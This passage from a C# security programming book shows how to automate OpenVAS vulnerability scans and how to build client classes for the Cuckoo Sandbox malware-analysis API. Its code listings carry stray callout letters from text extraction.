Class\nWe’ll use the OpenVASManager class (shown in Listing 7-11) to wrap the API\ncalls to start a scan, monitor the scan, and get the scan results.\npublic class OpenVASManager : IDisposable\n{\nprivate OpenVASSession _session;\npublic OpenVASManager(OpenVASSession usession)\n{\nif (session != null)\n_session = session;\nelse\nthrow new ArgumentNullException(\"session\");\n}\npublic XDocument vGetVersion()\n{\nreturn _session.ExecuteCommand(XDocument.Parse(\"<get_version />\"));\n}\nprivate void Dispose()\n{\n_session.Dispose();\n}\n}\nListing 7-11: The OpenVASManager constructor and GetVersion() method\nThe OpenVASManager class constructor takes one argument, an\nOpenVASSession u. If the session passed as the argument is null, we throw\nan exception because we can’t communicate with OpenVAS without a valid\nsession. Otherwise, we assign the session to a local class variable that we\ncan use from the methods in the class, such as GetVersion(). We then imple-\nment GetVersion() v to get the version of OpenVAS (as in Listing 7-9) and\nthe Dispose() method.\nWe can now replace the code calling ExecuteCommand() in our Main()\nmethod with the OpenVASManager to retrieve the OpenVAS version, as shown\nin Listing 7-12.\npublic static void Main(string[] args)\n{\nusing (OpenVASSession session = new OpenVASSession(\"admin\", \"admin\", \"192.168.1.19\"))\n{\nusing (OpenVASManager manager = new OpenVASManager(session))\n{\nXDocument version = manager.GetVersion();\nConsole.WriteLine(version);\n}\n}\n}\nListing 7-12: The Main() method retrieving the OpenVAS version with the OpenVASManager class\n140 Chapter 7\nThe programmer no longer needs to remember the XML required to\nget the version information because it is abstracted away behind a conve-\nnient method call. We can follow this same pattern for the rest of the API\ncommands we will be calling as well.\nGetting Scan Configurations and Creating Targets\nListing 7-13 shows how we’ll add the commands to run in OpenVASManager to\ncreate a new target and retrieve scan configurations.\npublic XDocument GetScanConfigurations()\n{\nreturn _session.ExecuteCommand(XDocument.Parse(u\"<get_configs />\"));\n}\npublic XDocument CreateSimpleTarget(string cidrRange, string targetName)\n{\nXDocument createTargetXML = new XDocument(\nnew XElement(v\"create_target\",\nnew XElement(\"name\", targetName),\nnew XElement(\"hosts\", cidrRange)));\nreturn _session.ExecuteCommand(createTargetXML);\n}\nListing 7-13: The OpenVAS GetScanConfigurations() and CreateSimpleTarget() methods\nThe GetScanConfigurations() method passes the <get_configs /> com-\nmand u to OpenVAS and returns the response. The CreateSimpleTarget()\nmethod accepts arguments for the IP address or CIDR range (192.168.1.0/24,\nfor instance) and a target name, which we use to build an XML document\nusing XDocument and XElement. The first XElement creates a root XML node of\ncreate_target v. The remaining two contain the name of the target and its\nhosts. Listing 7-14 shows the resulting XML document.\n<create_target>\n<name>Home Network</name>\n<hosts>192.168.1.0/24</hosts>\n</create_target>\nListing 7-14: The OpenVAS create_target command XML\nListing 7-15 shows how we create the target and scan it for the Discovery\nscan configuration, which performs a basic port scan and other basic net-\nwork tests.\nXDocument target = manager.uCreateSimpleTarget(\"192.168.1.31\", Guid.NewGuid().ToString());\nstring targetID = target.Root.Attribute(\"id\").vValue;\nXDocument configs = manager.GetScanConfigurations();\nstring discoveryConfigID = string.Empty;\nforeach (XElement node in configs.Descendants(\"name\"))\n{\nif (node.Value == w\"Discovery\")\nAutomating OpenVAS 141\n{\ndiscoveryConfigID = node.Parent.Attribute (\"id\").Value;\nbreak;\n}\n}\nConsole.xWriteLine(\"Creating scan of target \" + targetID + \" with scan config \" +\ndiscoveryConfigID);\nListing 7-15: Creating an OpenVAS target and retrieving the scan config ID\nFirst, we create the target to scan with CreateSimpleTarget() u by passing\nin an IP address to scan and a new Guid as the name of the target. For pur-\nposes of automation, we don’t need a human-readable name for the target,\nso we just generate a Guid for the name.\nnote In the future, you might want to name a target Databases or Workstations to\nseparate specific machines on your network for scanning. You could specify readable\nnames like these instead, but names must be unique for each target.)\nHere’s what a response to successful target creation should look like:\n<create_target_response status=\"201\" status_text=\"OK, resource created\"\nid=\"254cd3ef-bbe1-4d58-859d-21b8d0c046c6\"/>\nAfter creating the target, we grab the value of the id attribute v from\nthe XML response and store it for later use when we need to get the scan\nstatus. We then call GetScanConfigurations() to retrieve all available scan\nconfigurations, store them, and loop through them to find the one with\nthe name of Discovery w. Finally, we print a message to the screen with\nWriteLine() x, telling the user which target and scan configuration ID will\nbe used for the scan.\nCreating and Starting Tasks\nListing 7-16 shows how we create and start a scan with the OpenVASManager class.\npublic XDocument uCreateSimpleTask(string name, string comment, Guid configID, Guid targetID)\n{\nXDocument createTaskXML = new XDocument(\nnew XElement(v\"create_task\",\nnew XElement(\"name\", name),\nnew XElement(\"comment\", comment),\nnew XElement(\"config\",\nnew XAttribute(w\"id\", configID.ToString())),\nnew XElement(\"target\",\nnew XAttribute(\"id\", targetID.ToString()))));\nreturn _session.ExecuteCommand(createTaskXML);\n}\n142 Chapter 7\npublic XDocument xStartTask(Guid taskID)\n{\nXDocument startTaskXML = new XDocument(\nnew XElement(y\"start_task\",\nnew XAttribute(\"task_id\", taskID.ToString())));\nreturn _session.ExecuteCommand(startTaskXML);\n}\nListing 7-16: The OpenVAS methods to create and start a task\nThe CreateSimpleTask() method u creates a new task with a few basic\npieces of information. It is possible to create very complex task configura-\ntions. For purposes of a basic vulnerability scan, we build a simple XML\ndocument with a root create_task element v and some child elements to\nstore configuration information. The first two child elements are the name\nand comment (or description) of the task. Next are the scan config and target\nelements, with values stored as id attributes w. After setting up our XML,\nwe send the create_task command to OpenVAS and return the response.\nThe StartTask() method x accepts a single argument: the task ID to be\nstarted. We first create an XML element called start_task y with the attri-\nbute task_id.\nListing 7-17 shows how we add these two methods to Main().\nXDocument task = manager.CreateSimpleTask(Guid.NewGuid().ToString(),\nstring.Empty, new Guid(discoveryConfigID), new Guid(targetID));\nGuid taskID = new Guid(task.Root.uAttribute(\"id\").Value);\nmanager.vStartTask(taskID);\nListing 7-17: Creating and starting an OpenVAS task\nTo call CreateSimpleTask(), we pass a new Guid as the name of the task, an\nempty string for the comment, and the scan config ID and the target ID as\nthe argument. We pull the id attribute u from the root node of the XML\ndocument returned, which is the task ID; then we pass it to StartTask() v to\nstart the OpenVAS scan.\nWatching a Scan and Getting Scan Results\nIn order to watch the scan, we implement GetTasks() and GetTaskResults(),\nas shown in Listing 7-18. The GetTasks() method (which is implemented\nfirst) returns a list of tasks and their status so we can monitor our scan until\ncompletion. The GetTaskResults() method returns the scan results of a given\ntask so that we can see any vulnerabilities OpenVAS finds.\npublic XDocument GetTasks(Guid? taskID = unull)\n{\nif (taskID != null)\nAutomating OpenVAS 143\nreturn _session.ExecuteCommand(new XDocument(\nnew XElement(\"get_tasks\",\nnew vXAttribute(\"task_id\", taskID.ToString()))));\nreturn _session.ExecuteCommand(wXDocument.Parse(\"<get_tasks />\"));\n}\npublic XDocument GetTaskResults(Guid taskID)\n{\nXDocument getTaskResultsXML = new XDocument(\nnew xXElement(\"get_results\",\nnew XAttribute(\"task_id\", taskID.ToString())));\nreturn _session.ExecuteCommand(getTaskResultsXML);\n}\nListing 7-18: The OpenVASManager methods to get a list of current tasks and retrieve the\nresults of a given task\nThe GetTasks() method has a single, optional argument that is null u\nby default. The GetTasks() method will return either all of the current tasks\nor just a single task, depending on whether the taskID argument passed in\nis null. If the task ID passed in is not null, we create a new XML element\ncalled get_tasks with a task_id attribute v of the task ID passed in; then we\nsend the get_tasks command to OpenVAS and return the response. If the\nID is null, we use the XDocument.Parse() method w to create a new get_tasks\nelement without a specific ID to get; then we execute the command and\nreturn the result.\nThe GetTaskResults() method works like GetTasks() except that its single\nargument is not optional. Using the ID passed in as the argument, we create\na get_results XML node x with a task_id attribute. After passing this XML\nnode to ExecuteCommand(), we return the response.\nWrapping Up the Automation\nListing 7-19 shows how we can monitor the scan and retrieve its results\nwith the methods we just implemented. In our Main() method driving the\nSession/Manager classes, we can add the following code to round out our\nautomation.\nXDocument status = manager.uGetTasks(taskID);\nwhile (status.vDescendants(\"status\").First().Value != \"Done\")\n{\nThread.Sleep(5000);\nConsole.Clear();\nstring percentComplete = status.wDescendants(\"progress\").First().Nodes()\n.OfType<XText>().First().Value;\nConsole.WriteLine(\"The scan is \" + percentComplete + \"% done.\");\nstatus = manager.xGetTasks(taskID);\n}\n144 Chapter 7\nXDocument results = manager.yGetTaskResults(taskID);\nConsole.WriteLine(results.ToString());\nListing 7-19: Watching an OpenVAS scan until finished and then retrieving the scan results\nand printing them\nWe call GetTasks() u by passing in the task ID saved earlier and then save\nthe results in the status variable. Then, we use the LINQ to XML method\nDescendants() v to see whether the status node in the XML document is\nequal to Done, meaning the scan is finished. If the scan is not done, we Sleep()\nfor five seconds and then clear the console screen. We then get the comple-\ntion percentage of the scan by using Descendants() w to retrieve the progress\nnode, print the percentage, ask OpenVAS again for the current status with\nGetTasks() x, and so on until the scan reports it is done.\nOnce the scan finishes, we call GetTaskResults() y by passing in the task\nID; then we save and print the XML document containing the scan results\nto the console screen. This document includes a range of useful infor-\nmation, including detected hosts and open ports, known active services\nacross the scanned hosts, and known vulnerabilities such as old versions of\nsoftware.\nRunning the Automation\nScans may take a while, depending on the machine running OpenVAS\nand the speed of your network. While running, our automation will dis-\nplay a friendly message to let the user know the status of the current scan.\nSuccessful output should look similar to the heavily trimmed sample report\nshown in Listing 7-20.\nThe scan is 1% done.\nThe scan is 8% done.\nThe scan is 8% done.\nThe scan is 46% done.\nThe scan is 50% done.\nThe scan is 58% done.\nThe scan is 72% done.\nThe scan is 84% done.\nThe scan is 94% done.\nThe scan is 98% done.\n<get_results_response status=\"200\" status_text=\"OK\">\n<result id=\"57e9d1fa-7ad9-4649-914d-4591321d061a\">\n<owner>\n<name>admin</name>\n</owner>\n--snip--\n</result>\n</get_results_response>\nListing 7-20: Sample output of the OpenVAS automation\nAutomating OpenVAS 145\nConclusion\nThis chapter has shown you how to use the built-in networking classes in\nC# to automate OpenVAS. You learned how to create an SSL connection\nwith OpenVAS and how to communicate using the XML-based OMP. You\nlearned how to create a target to scan, retrieve available scan configura-\ntions, and start a particular scan on a target. You also learned how to moni-\ntor the progress of a scan and retrieve its results in an XML report.\nWith these basic blocks, we can begin remediating vulnerabilities on\nthe network and then run new scans to ensure the vulnerabilities are no\nlonger reported. The OpenVAS scanner is a very powerful tool, and we have\nonly scratched the surface. OpenVAS constantly has updated vulnerability\nfeeds and can be used as an effective vulnerability management solution.\nAs a next step, you might want to look into managing credentials for\nauthenticated vulnerability scans over SSH or creating custom scan con-\nfigurations to check for specific policy configurations. All of this is possible,\nand more, through OpenVAS.\n146 Chapter 7\n8\nau toMa tinG CuCkoo SanDBox\nCuckoo Sandbox is an open source p roject\nthat allows you to run malware samples\nwithin the safety of virtual machines, and\nthen analyze and report on how the malware\nbehaved in a virtual sandbox without the threat of\nthe malware infecting your real machine. Written\nin Python, Cuckoo Sandbox also offers a REST API\nthat allows a programmer using any language to fully automate many of\nCuckoo’s features, such as spinning up sandboxes, running malware, and\ngrabbing reports. In this chapter, we’ll do all of this with easy-to-use C#\nlibraries and classes. However, there is a lot of work to do, like setting up\nthe virtual environment for Cuckoo to use, before we can begin testing and\nrunning malware samples with C#. You can find more information about\nand download Cuckoo Sandbox at https://www.cuckoosandbox.org/.\nSetting up Cuckoo Sandbox\nWe won’t cover setting up Cuckoo Sandbox in this chapter because the\ninstructions can vary greatly between different operating systems—and\neven based on which version of Windows you use as the virtual machine\nsandbox. This chapter will assume that you correctly set up Cuckoo\nSandbox with a Windows guest and that Cuckoo is completely functional.\nBe sure to follow the directions on the main Cuckoo Sandbox website\n(http://docs.cuckoosandbox.org/en/latest/installation/), which provides up-\nto-date and thorough documentation on setting up and configuring the\nsoftware.\nIn the conf/cuckoo.conf file that ships with Cuckoo Sandbox, I recom-\nmend making an adjustment to the default timeout configuration so that it\nis shorter (I set mine to 15 seconds) before you begin working with the API.\nThis will make things easier and faster during testing. In your cuckoo.conf\nfile, you will see a section toward the bottom that looks like Listing 8-1.\n[timeouts]\n# Set the default analysis timeout expressed in seconds. This value will be\n# used to define after how many seconds the analysis will terminate unless\n# otherwise specified at submission.\ndefault = u120\nListing 8-1: The default timeout configuration section in cuckoo .conf\nThe default timeout for Cuckoo testing is set to 120 seconds u. A long\ntimeout can make you quite impatient to see if you fixed a problem dur-\ning debugging, since you must wait for the timeout to be reached before a\nreport is ready, but setting this value between 15 and 30 seconds should be\ngood for our purposes.\nManually running the Cuckoo Sandbox aPi\nLike Nessus, the Cuckoo Sandbox follows a REST pattern (see the descrip-\ntion of REST in Chapter 5 if you need a refresher). However, the Cuckoo\nSandbox API is far simpler than the Nessus API, since we only need to com-\nmunicate with a couple of API endpoints. To do this, we’ll continue to use\nthe session/manager pattern and implement the CuckooSession class first,\nwhich encompasses how we will communicate with the Cuckoo Sandbox\nAPI. Let’s check whether you set up Cuckoo Sandbox correctly, though,\nbefore we get started writing code.\nStarting the API\nWith Cuckoo Sandbox successfully installed, you should be able to start it\nlocally with the command ./cuckoo.py, as in Listing 8-2. If you receive an\nerror, ensure the VM you’re using for testing is running.\n148 Chapter 8\n$ ./cuckoo.py\neeee e e eeee e e eeeee eeeee\n8 8 8 8 8 8 8 8 8 88 8 88\n8e 8e 8 8e 8eee8e 8 8 8 8\n88 88 8 88 88 8 8 8 8 8\n88e8 88ee8 88e8 88 8 8eee8 8eee8\nCuckoo Sandbox 2.0-rc2\nwww.cuckoosandbox.org\nCopyright (c) 2010-2015\nChecking for updates...\nGood! You have the latest version available.\n2016-05-19 16:17:06,146 [lib.cuckoo.core.scheduler] INFO: Using \"virtualbox\" as machine manager\n2016-05-19 16:17:07,484 [lib.cuckoo.core.scheduler] INFO: Loaded 1 machine/s\n2016-05-19 16:17:07,495 [lib.cuckoo.core.scheduler] INFO: Waiting for analysis tasks...\nListing 8-2: Starting the Cuckoo Sandbox manager\nStarting Cuckoo successfully should yield a fun ASCII art banner,\nfollowed by quick informational lines about how many VMs have been\nloaded. After starting the main Cuckoo script, you need to start the API\nthat we’ll communicate with. Both of these Python scripts must be running\nat the same time! The cuckoo.py Python script is the engine behind Cuckoo\nSandbox. If we start the api.py script without starting the cuckoo.py script, as\nin Listing 8-3, then our API requests won’t do anything. For us to use the\nCuckoo Sandbox from the API, both cuckoo.py and api.py must be running.\nBy default, the Cuckoo Sandbox API listens on port 8090, as Listing 8-3\nshows.\n$ utils/api.py u-H 0.0.0.0\n* Running on vhttp://0.0.0.0:8090/ (Press CTRL+C to quit)\nListing 8-3: Running the HTTP API for Cuckoo Sandbox\nTo specify an IP address to listen on (the default is localhost), you can\npass the utils/api.py script the -H argument u, which tells the API which\nIP address to use when listening for API requests. In this case, we have set\n0.0.0.0 as the IP address to listen on, which means all network interfaces\n(both internal and external IP addresses for the system) will have port 8090\navailable for communication since we are using the default port. The URL\nthat the Cuckoo API is listening on is also printed to the screen v after\nstarting. This URL is how we’ll communicate with the API to drive Cuckoo\nSandbox in the rest of the chapter.\nChecking Cuckoo’s Status\nWe can test the API to ensure it has been set up correctly using the curl\ncommand line tool, as we have in previous chapters for other APIs. Later in\nAutomating Cuckoo Sandbox 149\nthe chapter, we make similar API requests to create a task, watch the task\nuntil completed, and report on the file to see how it behaved when it ran.\nBut to get started, Listing 8-4 shows how to use curl to retrieve the Cuckoo\nSandbox status information in JSON format with the HTTP API.\n$ curl http://127.0.0.1:8090/cuckoo/status\n{\n\"cpuload\": [\n0.0,\n0.02,\n0.05\n],\n\"diskspace\": {\n\"analyses\": {\n\"free\": 342228357120,\n\"total\": 486836101120,\n\"used\": 144607744000\n},\n\"binaries\": {\n\"free\": 342228357120,\n\"total\": 486836101120,\n\"used\": 144607744000\n}\n},\n\"hostname\": \"fdsa-E7450\",\nu\"machines\": {\n\"available\": 1,\n\"total\": 1\n},\n\"memory\": 82.06295645686164,\nv\"tasks\": {\n\"completed\": 0,\n\"pending\": 0,\n\"reported\": 3,\n\"running\": 0,\n\"total\": 13\n},\nw\"version\": \"2.0-rc2\"\n}\nListing 8-4: Using curl to retrieve the Cuckoo Sandbox status via the HTTP API\nThe status information is quite useful, detailing many aspects of the\nCuckoo Sandbox system. Of note is the aggregate task information v, with\nthe number of tasks that have been run or are running by Cuckoo, listed\nby status. A task could be analyzing a file that is running or opening a web\npage with a URL, though we’ll only cover submitting a file for analysis in\nthis chapter. You can also see the number of VMs you have available for\nanalysis u and the current version of Cuckoo w.\nGreat, the API is up and running! We’ll use this same status API end-\npoint later to test our code as we write it and to discuss the JSON it returns\nmore thoroughly. At the moment, we only need to confirm the API is up\nand running.\n150 Chapter 8\nCreating the CuckooSession Class\nNow that we know the API works and we can make HTTP requests and get\nthe JSON responses, we can start writing our code to drive Cuckoo Sandbox\nprogrammatically. Once we have the base classes built, we can submit a file\nthat will be analyzed as it runs and then report on the results. We’ll start\nwith the CuckooSession class, which begins in Listing 8-5.\npublic class uCuckooSession\n{\npublic CuckooSessionv(string host, int port)\n{\nthis.Host = host;\nthis.Port = port;\n}\npublic string wHost { get; set; }\npublic int xPort { get; set; }\nListing 8-5: Starting the CuckooSession class\nKeeping things simple to start with, we create the CuckooSession class u\nas well as the CuckooSession constructor. The constructor takes two argu-\nments v. The first is the host to connect to, and the second is the port on\nthe host on which the API will be listening. In the constructor, the two values\npassed as arguments are assigned to their respective properties, Host w and\nPort x, which are defined below the constructor. Next, we need to imple-\nment the methods available for the CuckooSession class.\nWriting the ExecuteCommand() Methods to Handle HTTP Requests\nCuckoo expects two kinds of HTTP requests when API requests are made:\na traditional HTTP request and a more complex HTTP multipart form\nrequest used for sending files to Cuckoo for analysis. We’ll implement two\nExecuteCommand() methods to cover these types of requests: first, we’ll use a\nsimpler ExecuteCommand() method that accepts two arguments for the tradi-\ntional request, and then we’ll overload it with an ExecuteCommand() method\nthat takes three arguments for the multipart request. Creating two methods\nwith the same name but with different arguments, or method overloading, is\nallowed in C#. This is a good example of when you would use method over-\nloading instead of a single method that accepts optional arguments because\nthe methods for each request are relatively different, despite sharing the\nsame name. Listing 8-6 details the simpler ExecuteCommand() method.\npublic JObject uExecuteCommand(string uri, string method)\n{\nHttpWebRequest req = (HttpWebRequest)WebRequest\n.vCreate(\"http://\" + this.Host + \":\" + this.Port + uri);\nreq.wMethod = method;\nstring resp = string.Empty;\nusing (Stream str = req.GetResponse().GetResponseStream())\nAutomating Cuckoo Sandbox 151\nusing (StreamReader rdr = new StreamReader(str))\nresp = rdr.xReadToEnd();\nJObject obj = JObject.yParse(resp);\nreturn obj;\n}\nListing 8-6: The simpler ExecuteCommand() method that accepts just a URI and the HTTP\nmethod as arguments\nThe first ExecuteCommand() method u takes two arguments: the URI to\nrequest and the HTTP method to use (GET, POST, PUT, and so on). After using\nCreate() v to build a new HTTP request and setting the Method property w\nof the request, we make the HTTP request and read x the response into a\nstring. Finally, we parse y the returned string as JSON and return the new\nJSON object.\nThe overloaded ExecuteCommand() method takes three arguments: the\nURI to request, the HTTP method, and a dictionary of parameters that will\nbe sent in an HTTP multipart request. Multipart requests allow you to send\nmore complex data such as binary files along with other HTTP parameters\nto a web server, which is exactly how we’ll use it. A full multipart request is\nshown later in Listing 8-9. How to send this type of request is detailed in\nListing 8-7.\npublic JObject uExecuteCommand(string uri, string method, IDictionary<string, object> parms)\n{\nHttpWebRequest req = (HttpWebRequest)WebRequest\n.vCreate(\"http://\" + this.Host + \":\" + this.Port + uri);\nreq.wMethod = method;\nstring boundary = xString.Format(\"----------{0:N}\", Guid.NewGuid());\nbyte[] data = yGetMultipartFormData(parms, boundary);\nreq.ContentLength = data.Length;\nreq.ContentType = z\"multipart/form-data; boundary=\" + boundary;\nusing (Stream parmStream = req.GetRequestStream())\nparmStream.{Write(data, 0, data.Length);\nstring resp = string.Empty;\nusing (Stream str = req.GetResponse().GetResponseStream())\nusing (StreamReader rdr = new StreamReader(str))\nresp = rdr.|ReadToEnd();\nJObject obj = JObject.}Parse(resp);\nreturn obj;\n}\nListing 8-7: The overloaded ExecuteCommand() method, which makes a multipart/form-data HTTP request\nThe second, more complex ExecuteCommand() method u takes three argu-\nments, as outlined earlier. After instantiating a new request v and setting\nthe HTTP method w, we create a boundary that will be used to separate the\nHTTP parameters in the multipart form request using String.Format() x.\n152 Chapter 8\nOnce the boundary is created, we call GetMultipartFormData() y (which we\nwill implement shortly) to convert the dictionary of parameters passed as\nthe third argument into a multipart HTTP form with the new boundary.\nAfter building the multipart HTTP data, we need to set up the HTTP\nrequest by setting the ContentLength and ContentType request properties based\non the multipart HTTP data. For the ContentType property, we also append\nthe boundary that will be used to separate the HTTP parameters z. Finally,\nwe can write { the multipart form data to the HTTP request stream and\nread | the response from the server. With the final response from the\nserver, we parse } the response as JSON and then return the JSON object.\nBoth of these ExecuteCommand() methods will be used to execute API calls\nagainst the Cuckoo Sandbox API. But before we can start calling the API\nendpoints, we need to write a bit more code.\nCreating Multipart HTTP Data with the GetMultipartFormData() Method\nAlthough the GetMultipartFormData() method is core to communicating with\nCuckoo Sandbox, I’m not going to go over it line by line. This method is\nactually a good example of a small weakness in the core libraries for C#\nbecause it shouldn’t be this complicated to make a multipart HTTP request.\nUnfortunately, there is no easy-to-use class available that allows us to do\nthis, so we need to create this method to build the HTTP multipart request\nfrom scratch. The raw technical details of building multipart HTTP requests\nare a bit out of scope for what we are looking to accomplish, so I’ll only\ngloss over the general flow of this method. The method in full (shown in\nListing 8-8, minus in-line comments) was written by Brian Grinstead,1 whose\nwork was then incorporated into the RestSharp client (http://restsharp.org/).\nprivate byte[] uGetMultipartFormData(IDictionary<string, object> postParameters, string boundary)\n{\nSystem.Text.Encoding encoding = System.Text.Encoding.ASCII;\nStream formDataStream = new System.IO.MemoryStream();\nbool needsCLRF = false;\nforeach (var param in postParameters)\n{\nif (needsCLRF)\nformDataStream.Write(encoding.GetBytes(\"\\r\\n\"), 0, encoding.GetByteCount(\"\\r\\n\"));\nneedsCLRF = true;\nif (param.Value is FileParameter)\n{\nFileParameter fileToUpload = (FileParameter)param.Value;\nstring header = string.Format(\"--{0}\\r\\nContent-Disposition: form-data; name=\\\"{1}\\\";\" +\n\"filename=\\\"{2}\\\";\\r\\nContent-Type: {3}\\r\\n\\r\\n\",\nboundary,\nparam.Key,\nfileToUpload.FileName ?? param.Key,\nfileToUpload.ContentType ?? \"application/octet-stream\");\n1. http://www.briangrinstead.com/blog/multipart-form-post-in-c/\nAutomating Cuckoo Sandbox 153\nformDataStream.Write(encoding.GetBytes(header), 0, encoding.GetByteCount(header));\nformDataStream.Write(fileToUpload.File, 0, fileToUpload.File.Length);\n}\nelse\n{\nstring postData = string.Format(\"--{0}\\r\\nContent-Disposition: form-data;\" +\n\"name=\\\"{1}\\\"\\r\\n\\r\\n{2}\",\nboundary,\nparam.Key,\nparam.Value);\nformDataStream.Write(encoding.GetBytes(postData), 0, encoding.GetByteCount(postData));\n}\n}\nstring footer = \"\\r\\n--\" + boundary + \"--\\r\\n\";\nformDataStream.Write(encoding.GetBytes(footer), 0, encoding.GetByteCount(footer));\nformDataStream.Position = 0;\nbyte[] formData = new byte[formDataStream.Length];\nformDataStream.Read(formData, 0, formData.Length);\nformDataStream.Close();\nreturn formData;\n}\n}\nListing 8-8: The GetMultipartFormData() method\nIn the GetMultipartFormData() method u, we start by accepting two argu-\nments: the first is the dictionary of parameters and their respective values\nthat we’ll turn into a multipart form, and the second is the string that we’ll\nuse to separate the file parameters in the request so they can be parsed out.\nThis second argument is called boundary, and we use it to tell the API to split\nthe HTTP request body using this boundary, and then use each section as a\nseparate parameter and value in the request. This can be hard to visualize,\nso Listing 8-9 details a sample HTTP multipart form request.\nPOST / HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:29.0) Gecko/20100101 Firefox/29.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Type: umultipart/form-data;\nboundaryv=------------------------9051914041544843365972754266\nContent-Length: 554\n--------------------------9051914041544843365972754266w\nContent-Disposition: form-data; xname=\"text\"\ntext defaulty\n--------------------------9051914041544843365972754266z\nContent-Disposition: form-data; name=\"file1\"; filename=\"a.txt\"\nContent-Type: text/plain\n154 Chapter 8\nContent of a.txt.\n--------------------------9051914041544843365972754266{\nContent-Disposition: form-data; name=\"file2\"; filename=\"a.html\"\nContent-Type: text/html\n<!DOCTYPE html><title>Content of a.html.</title>\n--------------------------9051914041544843365972754266--|\nListing 8-9: A sample HTTP multipart form request\nThis HTTP request looks a lot like what we are trying to build, so let’s\npoint out the important parts that were mentioned in GetMultipartFormData().\nFirst, note the Content-Type header is m ultipart/form-data u with a boundary v,\njust like the one we set in Listing 8-7. This boundary is used throughout the\nHTTP request (w, z, {, |) to separate each HTTP parameter. Each param-\neter also has a parameter name x and value y. The GetMultipartFormData()\nmethod takes the parameter names and values we pass in the Dictionary\nargument and the boundary and then turns them into a similar HTTP\nrequest using the given boundary to separate each parameter.\nProcessing File Data with the FileParameter Class\nIn order to send Cuckoo the file or malware we want to analyze, we need to\ncreate a class we can use to store the data for the file, such as the file type,\nfilename, and actual content of the file. The simple FileParameter class wraps\na bit of the information we need for the GetMultipartFormData() method. It’s\nshown in Listing 8-10.\npublic class uFileParameter\n{\npublic byte[] File { get; set; }\npublic string FileName { get; set; }\npublic string ContentType { get; set; }\npublic vFileParameter(byte[] file, string filename, string contenttype)\n{\nwFile = file;\nxFileName = filename;\nyContentType = contenttype;\n}\n}\nListing 8-10: The FileParameter class\nThe FileParameter class u represents the data we need to build an HTTP\nparameter that will contain the file to be analyzed. The constructor v for\nthe class accepts three arguments: the byte array containing the file con-\ntents, the name of the file, and the content type. Each argument is then\nassigned to the respective class property (w, x, y).\nAutomating Cuckoo Sandbox 155\nTesting the CuckooSession and Supporting Classes\nWe can test what we have written so far with a short and simple Main()\nmethod that requests the status of Cuckoo Sandbox using the API. We\ndid this manually in “Checking Cuckoo’s Status” on page 149. Listing 8-11\nshows how we can do this using the new CuckooSession class.\npublic static void uMain(string[] args)\n{\nCuckooSession session = new vCuckooSession(\"127.0.0.1\", 8090);\nJObject response = session.wExecuteCommand(\"/cuckoo/status\", \"GET\");\nConsole.xWriteLine(response.ToString());\n}\nListing 8-11: Main() method for retrieving the Cuckoo Sandbox status\nWith a new Main() method u, we first create a CuckooSession object v\nby passing the IP address and the port that Cuckoo Sandbox is running\non. If the API is running on your local machine, then 127.0.0.1 for the IP\nshould be fine. The IP and port (8090 by default) should have been set up\nwhen we started the API in Listing 8-3. Using the new session, we call the\nExecuteCommand() method w, passing the URI /cuckoo/status as the first argu-\nment and the HTTP method GET as the second method. The response is\nthen printed to the screen using WriteLine() x.\nRunning the Main() method should print a JSON dictionary to the\nscreen with status information about Cuckoo, as detailed in Listing 8-12.\n$ ./ch8_automating_cuckoo.exe\n{\n\"cpuload\": [\n0.0,\n0.03,\n0.05\n],\n\"diskspace\": {\n\"analyses\": {\n\"free\": 342524416000,\n\"total\": 486836101120,\n\"used\": 144311685120\n},\n\"binaries\": {\n\"free\": 342524416000,\n\"total\": 486836101120,\n\"used\": 144311685120\n}\n},\n\"hostname\": \"fdsa-E7450\",\n\"machines\": {\n\"available\": 1,\n\"total\": 1\n},\n\"memory\": 85.542549616647932,\n156 Chapter 8\n\"tasks\": {\n\"completed\": 0,\n\"pending\": 0,\n\"reported\": 2,\n\"running\": 0,\n\"total\": 12\n},\n\"version\": \"2.0-rc2\"\n}\nListing 8-12: Testing the CuckooSession class to print the current status information for the\nCuckoo Sandbox\nYou can see that the JSON information printed here is the same as\nwhen we ran the API command manually earlier to check Cuckoo’s status.\nwriting the CuckooManager Class\nWith the CuckooSession class and other supporting classes implemented,\nwe can move on to the CuckooManager class, which will wrap a few easy API\ncalls. To start off the CuckooManager class, we need the constructor shown in\nListing 8-13.\npublic class uCuckooManager : vIDisposable\n{\nCuckooSession w_session = null;\npublic xCuckooManager(CuckooSession session)\n{\ny_session = session;\n}\nListing 8-13: Starting the CuckooManager class\nThe CuckooManager class u starts by implementing the IDisposable inter-\nface v, which we’ll use to dispose of our private _session variable w when\nwe are finished with the CuckooManager class. The class constructor x takes\nonly a single argument: the session to use when communicating with the\nCuckoo Sandbox instance. The private _session variable is assigned with the\nargument passed to the constructor y so that the methods we will write\nshortly can use the session to make their specific API calls.\nWriting the CreateTask() Method\nThe first method in the CuckooManager class is CreateTask(), the most compli-\ncated manager method we’ll write. The CreateTask() method implements the\nHTTP call that will create a new task by determining the type of task we are\ncreating and then making the correct HTTP call, as shown in Listing 8-14.\npublic int uCreateTask(Task task)\n{\nstring param = null, uri = \"/tasks/create/\";\nobject val = null;\nAutomating Cuckoo Sandbox 157\nif v(task is FileTask)\n{\nbyte[] data;\nusing (FileStream str = new wFileStream((task as FileTask).Filepath,\nFileMode.Open,\nFileAccess.Read))\n{\ndata = new byte[str.Length];\nstr.xRead(data, 0, data.Length);\n}\nparam = \"file\";\nuri += param;\nval = new yFileParameter(data, (task as FileTask).Filepath,\n\"application/binary\");\n}\nIDictionary<string, object> zparms = new Dictionary<string, object>();\nparms.Add(param, val);\nparms.Add(\"package\", task.Package);\nparms.Add(\"timeout\", task.Timeout.ToString());\nparms.Add(\"options\", task.Options);\nparms.Add(\"machine\", {task.Machine);\nparms.Add(\"platform\", task.Platform);\nparms.Add(\"custom\", task.Custom);\nparms.Add(\"memory\", task.EnableMemoryDump.ToString());\nparms.Add(\"enforce_timeout\", task.EnableEnforceTimeout.ToString());\nJObject resp = _session.|ExecuteCommand(uri, \"POST\", parms);\nreturn }(int)resp[\"task_id\"];\n}\nListing 8-14: The CreateTask() method\nThe CreateTask() method u starts by first checking whether the task\npassed in is a FileTask class v (the class for describing a file or malware to\nbe analyzed). Because Cuckoo Sandbox supports more than just analyz-\ning files (such as URLs), the CreateTask() method can easily be extended to\ncreate different types of tasks this way. If the task is a FileTask, we open the\nfile to send to Cuckoo Sandbox with 